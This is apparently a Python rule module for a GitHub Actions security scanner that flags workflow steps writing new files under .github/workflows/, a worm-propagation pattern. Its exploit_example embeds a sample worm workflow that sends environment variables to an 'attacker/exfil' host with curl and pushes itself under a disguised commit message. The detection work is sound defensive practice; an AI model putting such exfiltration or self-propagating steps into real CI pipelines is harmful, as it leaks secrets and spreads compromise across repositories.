"""GHA-048. Workflow step writes a new file under ``.github/workflows/``."""
from __future__ import annotations

import re
from typing import Any

from ...base import Finding, Severity
from ...rule import Rule
from ..base import iter_jobs, iter_steps, step_location

RULE = Rule(
    id="GHA-048",
    title="Workflow step writes a file under .github/workflows/",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-1", "CICD-SEC-4"),
    esf=("ESF-D-CODE-INTEGRITY",),
    cwe=("CWE-94", "CWE-913"),
    recommendation=(
        "Remove the step that writes into ``.github/workflows/``. A "
        "workflow that authors a sibling workflow is the canonical "
        "worm-propagation primitive: the new file runs on the next "
        "matching trigger with the repo's GITHUB_TOKEN. There is no "
        "legitimate non-automation reason for an in-CI step to write "
        "workflow YAML; bot-style automation (release-please, "
        "Renovate) should be moved to an external account whose token "
        "is scoped, audited, and not the runner's ``GITHUB_TOKEN``. "
        "If the write is a templated scaffold (``cookiecutter`` for a "
        "new repo), do it in a separate, environment-gated job and "
        "ensure the target is never the same repo's workflows dir."
    ),
    docs_note=(
        "Fires when a ``run:`` body writes a file path containing "
        "``.github/workflows/`` via shell redirect (``>``, ``>>``), "
        "``tee``, ``cp`` / ``mv``, heredoc, ``cat <<EOF >``, or a "
        "templating tool (``envsubst``, ``yq -i``, ``sed -i``). The "
        "rule also fires on a ``uses:`` of a third-party action whose "
        "documented behavior is workflow file generation (anything "
        "matching ``stefanzweifel/git-auto-commit`` paired with a "
        "``.github/workflows`` argument). The single Shai-Hulud worm "
        "(2026) propagated via this exact pattern: a postinstall "
        "script wrote ``.github/workflows/shai-hulud-workflow.yml`` "
        "into every repo the stolen ``GITHUB_TOKEN`` could push to.\n\n"
        "Distinct from GHA-019 (token-to-file persistence) and "
        "GHA-049 (cross-repo push): GHA-048 catches the *content* "
        "(a workflow file is written somewhere on the runner), "
        "GHA-049 catches the *push* (the runner's git remote is a "
        "repo other than the one under test)."
    ),
    known_fp=(
        "Workflow-bootstrap repos (``cookiecutter-gh-action``, "
        "internal scaffolding for new microservices) legitimately "
        "scaffold ``.github/workflows/`` files. The right scope is a "
        "single, well-named step in an environment-gated job; "
        "suppress on that specific step with a rationale that names "
        "the destination repo and the gating environment.",
        "Bot accounts that legitimately republish workflow files "
        "(``release-please-action`` updating its own manifest) are "
        "narrow allow-list candidates rather than blanket suppression "
        "targets.",
    ),
    incident_refs=(
        "Shai-Hulud npm worm (2026): the malicious postinstall script "
        "in compromised packages used the runner's GITHUB_TOKEN to "
        "push ``.github/workflows/shai-hulud-workflow.yml`` into the "
        "victim's repos. On the next push trigger the worm ran with "
        "fresh token scope, repeating the propagation step against "
        "every repo the token could reach.",
    ),
    exploit_example=(
        "# Vulnerable: a build step writes a sibling workflow file.\n"
        "# After the next push to the default branch, the new\n"
        "# workflow runs with the repo's permissions and propagates.\n"
        "jobs:\n"
        "  build:\n"
        "    permissions: { contents: write }\n"
        "    steps:\n"
        "      - uses: actions/checkout@<sha>\n"
        "      - run: npm ci\n"
        "      - run: |\n"
        "          # postinstall-driven worm pattern:\n"
        "          cat > .github/workflows/shai-hulud.yml <<'EOF'\n"
        "          name: shai-hulud\n"
        "          on: push\n"
        "          jobs:\n"
        "            spread:\n"
        "              runs-on: ubuntu-latest\n"
        "              steps:\n"
        "                - run: curl -d @<(env) https://attacker/exfil\n"
        "          EOF\n"
        "          git add .github/workflows/shai-hulud.yml\n"
        "          git commit -m 'ci: add lint workflow'\n"
        "          git push\n"
        "\n"
        "# Safe: never author workflow YAML from inside another\n"
        "# workflow. Scaffold via an external bootstrapping job\n"
        "# that runs outside the runner's GITHUB_TOKEN scope."
    ),
)


# Any path with ``.github/workflows/`` followed by a likely workflow
# filename (``*.yml`` / ``*.yaml``). Wildcarded so ``cp wf.yml
# .github/workflows/`` also matches.
_WORKFLOW_PATH_RE = re.compile(
    r"\.github/workflows/(?:\S+\.ya?ml|\S*)",
    re.IGNORECASE,
)

# File-write idioms: shell redirect, tee, cp/mv, sed -i, envsubst.
# Each form has to land *near* a workflow-path mention to fire; a
# bare ``echo`` referencing the path in a log message is not a write.
_WRITE_IDIOMS_RE = re.compile(
    r"(?:>>?\s|tee(?:\s+-a)?\s+|cp\s+[^|\n]+\s+|mv\s+[^|\n]+\s+"
    r"|cat\s*<<-?\s*['\"]?\w+['\"]?|sed\s+-i\b|envsubst\b[^|\n]*>|yq\s+-i\b)",
    re.IGNORECASE,
)


def _step_writes_workflow(body: str) -> bool:
    """True when *body* both writes a file and names a workflow path.

    Look at the same line (or two-line window for piped here-docs)
    rather than the whole body so an early ``echo .github/workflows``
    log line followed by an unrelated ``> /tmp/log`` redirect doesn't
    fire.
    """
    if not _WORKFLOW_PATH_RE.search(body):
        return False
    # Cheap approximation: line-level co-occurrence. Splitting the body
    # by newline catches the most common shapes (the heredoc form is
    # the exception, but its terminator and the ``> .github/workflows``
    # line are close enough that the same-line window finds them).
    for line in body.splitlines():
        if _WORKFLOW_PATH_RE.search(line) and _WRITE_IDIOMS_RE.search(line):
            return True
    # Fallback: a heredoc may put the workflow path on the opener and
    # the EOF marker later. If the body uses ``cat <<...`` followed
    # somewhere by ``.github/workflows/``, count it.
    if re.search(r"cat\s*<<-?\s*['\"]?\w+['\"]?", body) and \
            _WORKFLOW_PATH_RE.search(body):
        return True
    return False


# Third-party actions whose documented behavior is to commit files
# under a configurable path. When paired with a ``.github/workflows/``
# target in ``with:``, they're the action-flavored counterpart to the
# shell ``cat > .github/workflows/...`` propagation primitive.
_WORKFLOW_AUTHORING_ACTIONS = (
    "stefanzweifel/git-auto-commit-action",
    "ad-m/github-push-action",
    "actions-js/push",
    "endbug/add-and-commit",
)


def _uses_writes_workflow(step: dict[str, Any]) -> bool:
    """True when a ``uses:`` step is one of the workflow-authoring
    actions and its ``with:`` arguments reference ``.github/workflows/``.
    """
    uses = step.get("uses")
    if not isinstance(uses, str):
        return False
    action = uses.split("@", 1)[0].strip().lower()
    if not any(action == a or action.startswith(a + "/") for a in _WORKFLOW_AUTHORING_ACTIONS):
        return False
    with_block = step.get("with")
    if not isinstance(with_block, dict):
        return False
    for v in with_block.values():
        if isinstance(v, str) and ".github/workflows/" in v:
            return True
    return False


def check(path: str, doc: dict[str, Any]) -> Finding:
    offenders: list[str] = []
    locations = []
    for job_id, job in iter_jobs(doc):
        for idx, step in enumerate(iter_steps(job)):
            run = step.get("run")
            hit = isinstance(run, str) and _step_writes_workflow(run)
            if not hit:
                hit = _uses_writes_workflow(step)
            if not hit:
                continue
            name = step.get("name") or step.get("id") or f"steps[{idx}]"
            offenders.append(f"{job_id}.{name}")
            locations.append(step_location(path, step))
    passed = not offenders
    desc = (
        "No workflow step writes a file under ``.github/workflows/``."
        if passed else
        f"{len(offenders)} step(s) write a file under ``.github/"
        f"workflows/``: {', '.join(offenders[:5])}"
        f"{'…' if len(offenders) > 5 else ''}. A workflow authoring a "
        f"sibling workflow is the worm-propagation primitive Shai-"
        f"Hulud used in 2026."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
